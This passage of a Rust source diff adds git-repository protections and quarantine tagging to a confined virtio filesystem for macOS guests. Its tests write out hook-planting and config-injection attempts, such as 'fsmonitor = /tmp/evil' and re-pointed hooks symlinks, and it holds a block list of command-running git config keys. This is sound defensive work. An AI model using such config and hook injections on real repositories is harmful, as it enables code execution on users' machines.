++    assert_eq!((QUARANTINE_FLAGS, QUARANTINE_AGENT, QUARANTINE_NAME), ("0081", "Winter Cowork", c"com.apple.quarantine"));
++}
++
++#[test]
++fn r16_an_exec_bit_setattr_a_write_open_or_truncate_of_an_executable_tags_it() {
++    let mut share = folder(|root| {
++        for name in ["doc", "script", "bin", "big", "plain"] {
++            fs::write(root.join(name), b"#!/bin/sh\n").unwrap();
++        }
++        for name in ["bin", "big"] {
++            fs::set_permissions(root.join(name), fs::Permissions::from_mode(0o755)).unwrap();
++        }
++    });
++    // A mode change without an execute bit, a read-only open, a write-open of a non-executable: no tag
++    // (the documented residual).
++    let doc = share.at("doc");
++    assert_eq!(share.setattr(doc, FATTR_MODE, 0o600, 0).error, 0);
++    let bin = share.at("bin");
++    let fh = share.open_ok(bin, RDONLY);
++    share.release(bin, fh);
++    assert_eq!(share.rewrite("plain", b"text\n"), 0);
++    for name in ["doc", "bin", "plain"] {
++        assert_eq!(tag_of(&share.root.join(name)), None, "{name}");
++    }
++    // An execute bit added.
++    let script = share.at("script");
++    assert_eq!(share.setattr(script, FATTR_MODE, 0o744, 0).error, 0);
++    assert_tagged(&share.root.join("script"));
++    // A write-open of an executable.
++    assert_eq!(share.open_w("bin"), 0);
++    assert_tagged(&share.root.join("bin"));
++    // A truncate of an executable.
++    let big = share.at("big");
++    assert_eq!(share.setattr(big, FATTR_SIZE, 0, 0).error, 0);
++    assert_tagged(&share.root.join("big"));
++}
++
++#[test]
++fn r16_a_tag_failure_fails_the_call_and_removes_a_new_node() {
++    let mut share = folder(|root| {
++        fs::write(root.join("exe"), b"x").unwrap();
++        fs::set_permissions(root.join("exe"), fs::Permissions::from_mode(0o755)).unwrap();
++        fs::write(root.join("doc"), b"x").unwrap();
++    });
++    let fail = || quarantine::FAIL_NEXT.store(true, Ordering::SeqCst);
++    fail();
++    assert_eq!(share.create(1, b"f", 0o755, RDWR).error, lx::EIO);
++    assert!(!share.root.join("f").exists());
++    fail();
++    assert_eq!(share.mkdir(1, b"d", 0o755).error, lx::EIO);
++    assert!(!share.root.join("d").exists());
++    fail();
++    let exe = share.at("exe");
++    assert_eq!(share.open(exe, WRONLY).error, lx::EIO);
++    fail();
++    assert_eq!(share.setattr(exe, FATTR_SIZE, 0, 0).error, lx::EIO);
++    assert_eq!(fs::read(share.root.join("exe")).unwrap(), b"x", "nothing changed");
++    fail();
++    let doc = share.at("doc");
++    assert_eq!(share.setattr(doc, FATTR_MODE, 0o755, 0).error, lx::EIO);
++    assert_eq!(mode_of(&share.root.join("doc")) & 0o111, 0, "the mode did not change");
++    assert!(!quarantine::FAIL_NEXT.load(Ordering::SeqCst));
++    assert_eq!(share.fs().open_descriptors(), share.fs().lock().dirs.len() + 1);
++}
++
++#[test]
++fn r15_forged_ids_still_reach_the_core_refusals() {
++    let mut share = folder(|root| plant_repo(&root.join("r"), PLAIN_CONFIG));
++    let r = share.at("r");
++    assert_eq!(share.rename(r, b".git", 9999, b"x").error, lx::EXDEV);
++    assert_eq!(share.link(9999, r, b"x").error, lx::EXDEV);
++    assert_eq!(share.create(9999, b"HEAD", 0o644, RDWR).error, lx::ESTALE);
++    assert_eq!(share.mkdir(9999, b"hooks", 0o755).error, lx::ESTALE);
++    assert!(share.root.join("r/.git").is_dir());
++}
++
++
++// ---- follow-up: symbolic links among the protected names (sh2d) --------------------------------------
++
++#[test]
++fn sh2d_symlinked_config_target_is_writable() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::rename(root.join("r/.git/config"), root.join("r/real-config")).unwrap();
++        symlink("../real-config", root.join("r/.git/config")).unwrap();
++    });
++    // The guest never looks up .git: the repository was read when r was resolved.
++    assert_eq!(share.rewrite("r/real-config", b"[core]\n\tfsmonitor = /tmp/evil\n"), EPERM);
++    assert_eq!(share.open_w("r/real-config"), EPERM);
++    assert_eq!(share.rm("r/real-config"), EPERM);
++    assert_eq!(share.ren("r/real-config", "r/moved"), EPERM);
++    assert_eq!(share.put("r/other", b"[core]\n\tfsmonitor = x\n"), 0);
++    assert_eq!(share.ren("r/other", "r/real-config"), EPERM);
++    assert_eq!(share.rm("r/.git/config"), EPERM);
++    assert_eq!(share.lock_rename("r/.git/config", PLAIN_CONFIG.as_bytes()), EPERM);
++    assert_eq!(fs::read_to_string(share.root.join("r/real-config")).unwrap(), PLAIN_CONFIG);
++    assert!(fs::symlink_metadata(share.root.join("r/.git/config")).unwrap().file_type().is_symlink());
++}
++
++#[test]
++fn sh2d_symlinked_hooks_target_is_writable() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::create_dir(root.join("r/realhooks")).unwrap();
++        fs::write(root.join("r/realhooks/pre-push"), b"#!/bin/sh\n").unwrap();
++        symlink("../realhooks", root.join("r/.git/hooks")).unwrap();
++        plant_repo(&root.join("m"), PLAIN_CONFIG);
++        symlink("../later", root.join("m/.git/hooks")).unwrap();
++    });
++    assert_eq!(share.put("r/realhooks/pre-commit", b""), EPERM);
++    assert!(!share.root.join("r/realhooks/pre-commit").exists());
++    assert_eq!(share.open_w("r/realhooks/pre-push"), EPERM);
++    assert_eq!(share.rm("r/realhooks/pre-push"), EPERM);
++    assert_eq!(share.ren("r/realhooks", "r/x"), EPERM);
++    // A link to a directory that does not exist yet: it cannot be made.
++    assert_eq!(share.md("m/later"), EPERM);
++    assert_eq!(share.sym("m/later", "elsewhere"), EPERM);
++    assert_eq!(share.notices(), vec![NoticeKind::GitProtected]);
++}
++
++#[test]
++fn sh2d_hooks_path_symlink_can_be_repointed() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), &format!("{PLAIN_CONFIG}\thooksPath = .githooks\n"));
++        fs::create_dir(root.join("r/safehooks")).unwrap();
++        fs::write(root.join("r/safehooks/pre-commit"), b"lint\n").unwrap();
++        symlink("safehooks", root.join("r/.githooks")).unwrap();
++    });
++    // The reviewer's sequence: unlink .githooks, link it to evilhooks, make evilhooks and its hook.
++    assert_eq!(share.rm("r/.githooks"), EPERM);
++    assert_eq!(share.ren("r/.githooks", "r/old"), EPERM);
++    assert_eq!(share.sym("r/.githooks", "evilhooks"), EPERM);
++    assert_eq!(share.put("r/x", b""), 0);
++    assert_eq!(share.ren("r/x", "r/.githooks"), EPERM);
++    assert_eq!(share.md("r/evilhooks"), 0);
++    assert_eq!(share.put("r/evilhooks/pre-commit", b"evil\n"), 0, "harmless: nothing names it");
++    // The resolved tree: safehooks and its hooks.
++    assert_eq!(share.put("r/safehooks/pre-push", b""), EPERM);
++    assert_eq!(share.open_w("r/safehooks/pre-commit"), EPERM);
++    assert_eq!(share.ren("r/safehooks", "r/gone"), EPERM);
++    assert_eq!(fs::read_link(share.root.join("r/.githooks")).unwrap(), Path::new("safehooks"));
++}
++
++#[test]
++fn sh2d_a_symlinked_dot_git_makes_its_git_directory_the_zone() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("store/w"), PLAIN_CONFIG);
++        fs::rename(root.join("store/w/.git"), root.join("store/w.git")).unwrap();
++        fs::remove_dir(root.join("store/w")).unwrap();
++        fs::create_dir_all(root.join("store/w.git/modules/x")).unwrap();
++        fs::create_dir(root.join("w")).unwrap();
++        symlink("../store/w.git", root.join("w/.git")).unwrap();
++    });
++    share.at("w");
++    // Below the git directory the link reaches, as below a .git.
++    assert_eq!(share.put("store/w.git/modules/x/config", b"[core]\n\tfsmonitor = x\n"), EPERM);
++    assert_eq!(share.md("store/w.git/modules/x/hooks"), EPERM);
++    assert_eq!(share.sym("store/w.git/modules/x/y", "z"), EPERM);
++    // The link itself cannot be removed, moved or re-pointed.
++    assert_eq!(share.rm("w/.git"), EPERM);
++    assert_eq!(share.ren("w/.git", "w/old"), EPERM);
++    assert_eq!(share.sym("w/.git", "../elsewhere"), EPERM);
++    // git keeps working there (an admitted config, a lock file).
++    assert_eq!(share.lock_rename("store/w.git/config", PLAIN_CONFIG.as_bytes()), 0);
++}
++
++#[test]
++fn sh2d_an_unreadable_or_malformed_config_fails_closed() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("u"), PLAIN_CONFIG);
++        fs::set_permissions(root.join("u/.git/config"), fs::Permissions::from_mode(0o000)).unwrap();
++        plant_repo(&root.join("b"), "[core\n\thooksPath = h\n");
++    });
++    share.at("u");
++    assert_eq!(share.notices(), vec![NoticeKind::GitProtected], "reported at discovery");
++    assert_eq!(share.lock_rename("u/.git/config", PLAIN_CONFIG.as_bytes()), EPERM);
++    assert_eq!(share.rm("u/.git/config"), EPERM);
++    share.at("b");
++    assert_eq!(share.lock_rename("b/.git/config", PLAIN_CONFIG.as_bytes()), EPERM);
++    assert_eq!(share.open_w("b/.git/config"), EPERM);
++    assert_eq!(fs::read(share.root.join("b/.git/config")).unwrap(), b"[core\n\thooksPath = h\n");
++    let _ = fs::set_permissions(share.root.join("u/.git/config"), fs::Permissions::from_mode(0o600));
++}
++
++#[test]
++fn sh2d_no_symbolic_link_in_a_dot_git_chain_but_git_s_own_probe() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::create_dir(root.join("r/.git/logs")).unwrap();
++        symlink("x", root.join("r/link")).unwrap();
++    });
++    for path in ["r/.git/info", "r/.git/modules", "r/.git/refs/heads/x", "r/.git/logs/HEAD", "r/.git/HEAD2"] {
++        assert_eq!(share.sym(path, "../../elsewhere"), EPERM, "{path}");
++    }
++    assert_eq!(share.sym("r/.git/tAb12c3", "other"), EPERM, "the probe points at testing only");
++    assert_eq!(share.sym("r/.git/tAb12c3x", "testing"), EPERM, "the probe's name is t and six characters");
++    assert_eq!(share.sym("r/.git/tAb12c3", "testing"), 0);
++    assert_eq!(share.rm("r/.git/tAb12c3"), 0);
++    // Moved in or hard-linked in: refused too.
++    assert_eq!(share.ren("r/link", "r/.git/link"), EPERM);
++    assert_eq!(share.hard("r/link", "r/.git/link"), EPERM);
++    assert_eq!(share.ren("r/link", "r/.git/refs/link"), EPERM);
++    // Outside a .git chain links are ordinary work.
++    assert_eq!(share.sym("r/src-link", "src"), 0);
++}
++
++#[test]
++fn sh2d_nested_git_directories_are_read_before_anything_below_is_served() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        let module = root.join("r/.git/modules/a/b");
++        fs::create_dir_all(module.join("objects")).unwrap();
++        fs::write(module.join("HEAD"), "ref: refs/heads/main\n").unwrap();
++        fs::write(module.join("config"), format!("{PLAIN_CONFIG}\thooksPath = ../../../../tracked\n")).unwrap();
++        symlink("../../../../x-hooks", module.join("hooks")).unwrap();
++        fs::create_dir(root.join("r/x-hooks")).unwrap();
++        fs::create_dir(root.join("r/tracked")).unwrap();
++    });
++    // Never looking up .git/modules: both are protected from the first lookup of r.
++    assert_eq!(share.put("r/x-hooks/pre-commit", b""), EPERM);
++    assert_eq!(share.put("r/tracked/pre-commit", b""), EPERM);
++}
++
++#[test]
++fn sh2d_past_the_scan_budget_the_whole_git_directory_is_held() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        for i in 0..=git::SCAN_BUDGET {
++            fs::create_dir_all(root.join(format!("r/.git/modules/m{i}"))).unwrap();
++        }
++    });
++    share.at("r");
++    assert_eq!(share.notices(), vec![NoticeKind::GitProtected]);
++    assert_eq!(share.put("r/.git/objects/x", b""), EPERM);
++    assert_eq!(share.lock_rename("r/.git/HEAD", b"ref: refs/heads/x\n"), EPERM);
++}
+diff --git a/src/devices/src/virtio/fs/macos/confined/gitconfig.rs b/src/devices/src/virtio/fs/macos/confined/gitconfig.rs
+new file mode 100644
+index 0000000..dd78b76
+--- /dev/null
++++ b/src/devices/src/virtio/fs/macos/confined/gitconfig.rs
+@@ -0,0 +1,357 @@
++// R15 (M-a): a strict git-config parser and the admitted-key allowlist with its suffix backstop.
++//
++// The parser follows git's own config syntax (config.c): sections, quoted subsections, the legacy
++// `[section.subsection]` form, keys, quoting, the four escapes and continuation lines. Anything git would
++// reject, and anything ambiguous (a NUL byte, an unknown escape, an unterminated quote), is a parse error,
++// and a parse error refuses the write.
++
++/// One `section[.subsection].key = value` entry. Section and key names are folded as git folds them
++/// (ASCII lower case); a quoted subsection is kept exactly, a legacy one is lower-cased as git does.
++/// `value` is `None` for a key written without `=` (git's boolean true).
++#[derive(Clone, Debug, PartialEq, Eq, Hash)]
++pub struct ConfigEntry {
++    pub section: String,
++    pub subsection: Option<Vec<u8>>,
++    pub key: String,
++    pub value: Option<Vec<u8>>,
++}
++
++impl ConfigEntry {
++    /// `section.subsection.key` as git prints it.
++    pub fn name(&self) -> String {
++        match &self.subsection {
++            Some(sub) => format!("{}.{}.{}", self.section, String::from_utf8_lossy(sub), self.key),
++            None => format!("{}.{}", self.section, self.key),
++        }
++    }
++}
++
++#[derive(Debug, PartialEq, Eq)]
++pub struct ParseError;
++
++struct Cursor<'a> {
++    text: &'a [u8],
++    at: usize,
++}
++
++impl Cursor<'_> {
++    /// The next byte; the end of the text reads as a newline, as in git.
++    fn next(&mut self) -> Option<u8> {
++        let c = self.text.get(self.at).copied();
++        if c.is_some() {
++            self.at += 1;
++        }
++        c
++    }
++    fn peek(&self) -> Option<u8> {
++        self.text.get(self.at).copied()
++    }
++}
++
++fn is_space(c: u8) -> bool {
++    matches!(c, b' ' | b'\t' | b'\r' | b'\x0b' | b'\x0c')
++}
++
++/// Parses a whole config file. Every entry is returned in file order.
++pub fn parse(text: &[u8]) -> Result<Vec<ConfigEntry>, ParseError> {
++    if text.contains(&0) {
++        return Err(ParseError);
++    }
++    let text = text.strip_prefix(b"\xef\xbb\xbf").unwrap_or(text);
++    let mut c = Cursor { text, at: 0 };
++    let mut section: Option<(String, Option<Vec<u8>>)> = None;
++    let mut entries = Vec::new();
++    while let Some(ch) = c.next() {
++        match ch {
++            b'\n' => {}
++            _ if is_space(ch) => {}
++            b'#' | b';' => skip_line(&mut c),
++            b'[' => section = Some(header(&mut c)?),
++            _ if ch.is_ascii_alphabetic() => {
++                let Some((name, sub)) = section.clone() else { return Err(ParseError) };
++                let (key, value) = key_value(ch, &mut c)?;
++                entries.push(ConfigEntry { section: name, subsection: sub, key, value });
++            }
++            _ => return Err(ParseError),
++        }
++    }
++    Ok(entries)
++}
++
++fn skip_line(c: &mut Cursor) {
++    while let Some(ch) = c.next() {
++        if ch == b'\n' {
++            break;
++        }
++    }
++}
++
++/// `[name]`, `[name "subsection"]` or the legacy `[name.subsection]`.
++fn header(c: &mut Cursor) -> Result<(String, Option<Vec<u8>>), ParseError> {
++    let mut name = String::new();
++    loop {
++        let ch = c.next().ok_or(ParseError)?;
++        match ch {
++            b']' => break,
++            _ if is_space(ch) => return quoted_header(c, name),
++            _ if ch.is_ascii_alphanumeric() || ch == b'-' || ch == b'.' => name.push(ch.to_ascii_lowercase() as char),
++            _ => return Err(ParseError),
++        }
++    }
++    if name.is_empty() || name.starts_with('.') || name.ends_with('.') || name.contains("..") {
++        return Err(ParseError);
++    }
++    // The legacy form: git keys it as `name.subsection.key` with the subsection lower-cased.
++    match name.split_once('.') {
++        Some((section, sub)) => Ok((section.to_owned(), Some(sub.as_bytes().to_vec()))),
++        None => Ok((name, None)),
++    }
++}
++
++fn quoted_header(c: &mut Cursor, name: String) -> Result<(String, Option<Vec<u8>>), ParseError> {
++    if name.is_empty() || name.contains('.') {
++        return Err(ParseError);
++    }
++    loop {
++        match c.next().ok_or(ParseError)? {
++            ch if is_space(ch) => {}
++            b'"' => break,
++            _ => return Err(ParseError),
++        }
++    }
++    let mut sub = Vec::new();
++    loop {
++        match c.next().ok_or(ParseError)? {
++            b'\n' => return Err(ParseError),
++            b'"' => break,
++            b'\\' => match c.next().ok_or(ParseError)? {
++                b'\n' => return Err(ParseError),
++                other => sub.push(other),
++            },
++            other => sub.push(other),
++        }
++    }
++    if c.next() != Some(b']') {
++        return Err(ParseError);
++    }
++    Ok((name, Some(sub)))
++}
++
++fn key_value(first: u8, c: &mut Cursor) -> Result<(String, Option<Vec<u8>>), ParseError> {
++    let mut key = String::new();
++    key.push(first.to_ascii_lowercase() as char);
++    while let Some(ch) = c.peek() {
++        if ch.is_ascii_alphanumeric() || ch == b'-' {
++            key.push(ch.to_ascii_lowercase() as char);
++            c.at += 1;
++        } else {
++            break;
++        }
++    }
++    while let Some(ch) = c.peek() {
++        if ch == b' ' || ch == b'\t' {
++            c.at += 1;
++        } else {
++            break;
++        }
++    }
++    match c.next() {
++        None | Some(b'\n') => Ok((key, None)),
++        Some(b'#') | Some(b';') => {
++            skip_line(c);
++            Ok((key, None))
++        }
++        Some(b'\r') if matches!(c.peek(), None | Some(b'\n')) => {
++            c.next();
++            Ok((key, None))
++        }
++        Some(b'=') => Ok((key, Some(value(c)?))),
++        Some(_) => Err(ParseError),
++    }
++}
++
++/// A value, as git reads it: leading blanks dropped, inner unquoted blanks kept, trailing unquoted blanks
++/// dropped, `#`/`;` outside quotes start a comment, `\` + newline continues.
++fn value(c: &mut Cursor) -> Result<Vec<u8>, ParseError> {
++    let mut out = Vec::new();
++    let mut quote = false;
++    let mut comment = false;
++    let mut space = 0usize;
++    loop {
++        let ch = c.next().unwrap_or(b'\n');
++        if ch == b'\n' {
++            if quote {
++                return Err(ParseError);
++            }
++            return Ok(out);
++        }
++        if comment {
++            continue;
++        }
++        if is_space(ch) && !quote {
++            if !out.is_empty() {
++                space += 1;
++            }
++            continue;
++        }
++        if !quote && (ch == b';' || ch == b'#') {
++            comment = true;
++            continue;
++        }
++        for _ in 0..space {
++            out.push(b' ');
++        }
++        space = 0;
++        match ch {
++            b'\\' => match c.next().unwrap_or(b'\n') {
++                b'\n' => {}
++                b't' => out.push(b'\t'),
++                b'b' => out.push(8),
++                b'n' => out.push(b'\n'),
++                b'\\' => out.push(b'\\'),
++                b'"' => out.push(b'"'),
++                _ => return Err(ParseError),
++            },
++            b'"' => quote = !quote,
++            other => out.push(other),
++        }
++    }
++}
++
++/// The suffix backstop: a key whose last component ends in one of these (folded) is refused even when a
++/// wildcard admits it.
++pub const REFUSED_SUFFIXES: [&str; 11] =
++    ["cmd", "command", "program", "path", "helper", "hook", "editor", "pager", "driver", "textconv", "proxy"];
++
++/// The keys admitted by name (`*` is any subsection): what git itself writes and plainly inert settings.
++/// Two keys are admitted only conditionally and are decided apart: `submodule.*.update` with an inert value
++/// (`ADMITTED_UPDATE_VALUES`), and `core.worktree` where the caller says so (a submodule's own git directory
++/// naming a work tree inside the share, which git writes; see `ConfinedFs::worktree_ok`).
++pub const ADMITTED: [&str; 30] = [
++    "core.repositoryformatversion",
++    "core.filemode",
++    "core.bare",
++    "core.logallrefupdates",
++    "core.ignorecase",
++    "core.precomposeunicode",
++    "core.symlinks",
++    "core.sparsecheckout",
++    "core.sparsecheckoutcone",
++    "extensions.objectformat",
++    "extensions.worktreeconfig",
++    "remote.*.url",
++    "remote.*.pushurl",
++    "remote.*.fetch",
++    "remote.*.tagopt",
++    "remote.*.prune",
++    "branch.*.remote",
++    "branch.*.merge",
++    "branch.*.rebase",
++    "branch.*.pushremote",
++    "submodule.*.url",
++    "submodule.*.active",
++    "user.name",
++    "user.email",
++    "push.default",
++    "rebase.autostash",
++    "fetch.prune",
++    "init.defaultbranch",
++    "index.sparse",
++    "submodule.*.update",
++];
++
++/// Sections admitted whole (any subsection, any key), minus the suffix backstop; `lfs` also minus
++/// `lfs.customtransfer.*` and `lfs.extension.*`.
++pub const ADMITTED_SECTIONS: [&str; 2] = ["lfs", "pull"];
++
++/// The only values `submodule.<n>.update` may take (`!command` and anything else are refused).
++pub const ADMITTED_UPDATE_VALUES: [&[u8]; 4] = [b"checkout", b"rebase", b"merge", b"none"];
++
++/// The refusals the design names (every one is also outside the allowlist). Kept for the tests.
++pub const NAMED_REFUSALS: [&str; 41] = [
++    "core.worktree",
++    "core.fsmonitor",
++    "core.hookspath",
++    "core.sshcommand",
++    "core.editor",
++    "core.pager",
++    "core.askpass",
++    "core.gitproxy",
++    "core.alternaterefscommand",
++    "credential.helper",
++    "diff.external",
++    "diff.x.textconv",
++    "diff.x.command",
++    "difftool.x.cmd",
++    "merge.x.driver",
++    "mergetool.x.cmd",
++    "filter.x.clean",
++    "filter.x.smudge",
++    "filter.x.process",
++    "include.path",
++    "includeif.gitdir:/x.path",
++    "alias.x",
++    "sequence.editor",
++    "pager.log",
++    "gpg.program",
++    "commit.gpgsign",
++    "tag.gpgsign",
++    "push.gpgsign",
++    "uploadpack.packobjectshook",
++    "receive.procreceiverefs",
++    "remote.x.uploadpack",
++    "remote.x.receivepack",
++    "remote.x.vcs",
++    "protocol.allow",
++    "sendemail.smtpserver",
++    "web.browser",
++    "browser.x.path",
++    "man.viewer",
++    "instaweb.httpd",
++    "guitool.x.cmd",
++    "submodule.x.update",
++];
++
++pub fn suffix_refused(key: &str) -> bool {
++    let key = key.to_ascii_lowercase();
++    REFUSED_SUFFIXES.iter().any(|s| key.ends_with(s))
++}
++
++fn lfs_refused_subsection(sub: &[u8]) -> bool {
++    let sub = sub.to_ascii_lowercase();
++    for prefix in [&b"customtransfer"[..], b"extension"] {
++        if sub == prefix || (sub.starts_with(prefix) && sub.get(prefix.len()) == Some(&b'.')) {
++            return true;
++        }
++    }
++    false
++}
++
++/// Whether one entry may be added or changed by the guest. `worktree_ok` decides the one location-bound
++/// key, `core.worktree`.
++pub fn admitted(e: &ConfigEntry, worktree_ok: &mut dyn FnMut(&[u8]) -> bool) -> bool {
++    if suffix_refused(&e.key) {
++        return false;
++    }
++    let section = e.section.as_str();
++    if section == "lfs" {
++        return !e.subsection.as_deref().is_some_and(lfs_refused_subsection);
++    }
++    if ADMITTED_SECTIONS.contains(&section) {
++        return true;
++    }
++    if section == "core" && e.key == "worktree" {
++        return e.subsection.is_none() && e.value.as_deref().is_some_and(|v| worktree_ok(v));
++    }
++    if section == "submodule" && e.key == "update" {
++        return e.subsection.is_some() && e.value.as_deref().is_some_and(|v| ADMITTED_UPDATE_VALUES.contains(&v));
++    }
++    ADMITTED.iter().any(|pattern| {
++        let parts: Vec<&str> = pattern.split('.').collect();
++        match (parts.as_slice(), &e.subsection) {
++            ([s, k], None) => *s == section && *k == e.key,
++            ([s, "*", k], Some(_)) => *s == section && *k == e.key,
++            _ => false,
++        }
++    })
++}
+diff --git a/src/devices/src/virtio/fs/macos/confined/mod.rs b/src/devices/src/virtio/fs/macos/confined/mod.rs
+index 5e0a0e6..1ef5a51 100644
+--- a/src/devices/src/virtio/fs/macos/confined/mod.rs
++++ b/src/devices/src/virtio/fs/macos/confined/mod.rs
+@@ -11,16 +11,25 @@
+ // confined dispatch of `server.rs` (`Server::handle_confined_message`).
+ //
+ // Extension points: every mutating operation passes one chokepoint, `ConfinedFs::admit(&Mutation)`, which
+-// applies the read-only refusal and then `ConfinedHooks::admit`; every new regular file or directory passes
+-// `ConfinedHooks::created` with its descriptor before the reply, and a failure removes the new node and
+-// answers `EIO`.
++// applies the read-only refusal, then the git rules (R15, `git.rs`, on read-write folder sources), then
++// `ConfinedHooks::admit`; every new regular file or directory is quarantine-tagged on a read-write share
++// (R16, `quarantine.rs`) and passes `ConfinedHooks::created` with its descriptor before the reply, and a
++// failure of either removes the new node and answers `EIO`.
+ 
++mod git;
++mod gitconfig;
+ mod names;
++mod notice;
++mod quarantine;
+ mod sys;
+ #[cfg(test)]
+ mod tests;
+ 
++pub use git::{fold, PointerKind, GIT_HOOKS, INCLUDE_DEPTH, POINTER_MAX};
++pub use gitconfig::{admitted, parse as parse_git_config, ConfigEntry, ADMITTED, ADMITTED_SECTIONS, NAMED_REFUSALS, REFUSED_SUFFIXES};
+ pub use names::{check_name, is_hfs_ignorable, NAME_MAX};
++pub use notice::{NoticeKind, ShareNotices, NOTICE_CAPACITY};
++pub use quarantine::{QUARANTINE_AGENT, QUARANTINE_FLAGS, QUARANTINE_NAME};
+ pub use sys::lx;
+ 
+ use std::collections::HashMap;
+@@ -72,7 +81,8 @@ const LINUX_SEEK_HOLE: u32 = 4;
+ const LINUX_W_OK: u32 = 2;
+ 
+ /// The three share flags of the ABI (`krun_cowork_add_share_v1`): bit 0 read-only, bit 1 Winter share
+-/// (R5 `O_UNIQUE`, R13 `F_FULLFSYNC`), bit 2 folder rules (R15, a later patch). Every other bit is refused.
++/// (R5 `O_UNIQUE`, R13 `F_FULLFSYNC`), bit 2 folder rules (R15, on a read-write share). Every other bit is
++/// refused. R16 (the quarantine tag) applies to every share that is not read-only.
+ #[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+ pub struct ShareFlags {
+     pub read_only: bool,
+@@ -304,6 +314,8 @@ struct Handle {
+     node: u64,
+     body: Body,
+     writable: bool,
++    /// R15: a pointer file's content, held until FLUSH or RELEASE checks it.
++    pointer: Option<git::Pointer>,
+ }
+ 
+ impl Handle {
+@@ -325,6 +337,8 @@ struct State {
+     next_handle: u64,
+     /// R10: the node-table cap (`MAX_NODES`; smaller only in tests).
+     node_cap: usize,
++    /// R15 on a read-write folder source; `None` elsewhere.
++    git: Option<git::GitState>,
+ }
+ 
+ /// The confined filesystem of one share.
+@@ -339,6 +353,10 @@ pub struct ConfinedFs {
+     hooks: Box<dyn ConfinedHooks>,
+     full_syncs: AtomicU64,
+     plain_syncs: AtomicU64,
++    /// R16: every share that is not read-only tags what the guest creates or makes executable.
++    quarantine: bool,
++    /// R15: the `share_notice` sink the device layer drains.
++    notices: ShareNotices,
+ }
+ 
+ fn dev_ino(st: &libc::stat) -> (u64, u64) {
+@@ -360,7 +378,9 @@ impl ConfinedFs {
+         );
+         let mut ids = HashMap::new();
+         ids.insert((dev, ino), ROOT_ID);
+-        Ok(ConfinedFs {
++        let rules = cfg.flags.folder_rules && !cfg.flags.read_only;
++        let git = rules.then(|| git::GitState::new(sys::case_sensitive(cfg.root.as_raw_fd())));
++        let fs = ConfinedFs {
+             state: Mutex::new(State {
+                 root: Some(Arc::new(cfg.root)),
+                 nodes,
+@@ -370,6 +390,7 @@ impl ConfinedFs {
+                 handles: HashMap::new(),
+                 next_handle: 1,
+                 node_cap: MAX_NODES,
++                git,
+             }),
+             host: Host { unique: cfg.flags.winter_share },
+             flags: cfg.flags,
+@@ -380,7 +401,15 @@ impl ConfinedFs {
+             hooks: Box::new(NoHooks),
+             full_syncs: AtomicU64::new(0),
+             plain_syncs: AtomicU64::new(0),
+-        })
++            quarantine: !cfg.flags.read_only,
++            notices: ShareNotices::default(),
++        };
++        // R15: the root's repository (if any) is read before anything is served.
++        {
++            let mut st = fs.lock();
++            fs.git_discover(&mut st, ROOT_ID)?;
++        }
++        Ok(fs)
+     }
+ 
+     pub fn with_hooks(mut self, hooks: Box<dyn ConfinedHooks>) -> Self {
+@@ -400,6 +429,11 @@ impl ConfinedFs {
+         (self.root_dev, self.root_ino)
+     }
+ 
++    /// The `share_notice` sink (R15): the device layer drains it and the worker tags and rate-limits it.
++    pub fn notices(&self) -> ShareNotices {
++        self.notices.clone()
++    }
++
+     /// A handle on this device's revoke flag, for the thread that receives the revocation.
+     pub fn revoke_switch(&self) -> RevokeSwitch {
+         self.revoke.clone()
+@@ -439,9 +473,11 @@ impl ConfinedFs {
+         Ok(())
+     }
+ 
+-    /// The one chokepoint of every mutating operation: read-only first (R8), then the policy hooks.
++    /// The one chokepoint of every mutating operation: read-only first (R8), then the git rules (R15),
++    /// then the policy hooks.
+     fn admit(&self, op: &Mutation) -> io::Result<()> {
+         self.writable()?;
++        self.git_admit(op)?;
+         self.hooks.admit(op)
+     }
+ 
+@@ -668,7 +704,7 @@ impl ConfinedFs {
+         let body = if dir { Body::Dir(DirStream::new(fd)?) } else { Body::File(File::from(fd)) };
+         let h = st.next_handle;
+         st.next_handle += 1;
+-        st.handles.insert(h, Handle { node, body, writable });
++        st.handles.insert(h, Handle { node, body, writable, pointer: None });
+         Ok(h)
+     }
+ 
+@@ -697,9 +733,11 @@ impl ConfinedFs {
+         }
+     }
+ 
+-    /// Runs the created hook; on failure removes the new node through its parent and answers `EIO`.
++    /// Sets the quarantine tag (R16) and runs the created hook; on a failure of either removes the new
++    /// node through its parent and answers `EIO`.
+     fn finish_create(&self, pfd: RawFd, name: &CStr, fd: BorrowedFd<'_>, kind: CreatedKind) -> io::Result<()> {
+-        if self.hooks.created(fd, kind).is_err() {
++        let tagged = !self.quarantine || quarantine::tag(fd.as_raw_fd()).is_ok();
++        if !tagged || self.hooks.created(fd, kind).is_err() {
+             let _ = self.host.unlinkat(pfd, name, kind == CreatedKind::Directory);
+             return Err(err(lx::EIO));
+         }
+@@ -711,6 +749,7 @@ impl ConfinedFs {
+         let pfd = self.dir_fd(st, parent)?;
+         let s = self.host.fstatat(pfd.as_raw_fd(), name)?;
+         self.same_device(&s)?;
++        let first = !st.ids.contains_key(&dev_ino(&s));
+         let id = if kind_of(s.st_mode) == Kind::Dir {
+             let fd = self.open_dir_at(pfd.as_raw_fd(), name, s.st_dev as u64, s.st_ino)?;
+             let id = self.insert(st, parent, name, &s)?;
+@@ -719,6 +758,15 @@ impl ConfinedFs {
+         } else {
+             self.insert(st, parent, name, &s)?
+         };
++        if st.git.is_some() {
++            // R15: a directory's repository is read the first time it is resolved, before the answer; a
++            // protected name is held by its identity from here on.
++            let checked = if first && kind_of(s.st_mode) == Kind::Dir { self.git_discover(st, id) } else { Ok(()) };
++            if let Err(e) = checked.and_then(|_| self.git_hold(st, id)) {
++                self.forget_one(st, id, 1);
++                return Err(e);
++            }
++        }
+         Ok(self.entry(ctx, id, s))
+     }
+ }
+@@ -792,6 +840,13 @@ impl FileSystem for ConfinedFs {
+         if valid.intersects(SetattrValid::UID | SetattrValid::GID) {
+             return Err(err(lx::EPERM));
+         }
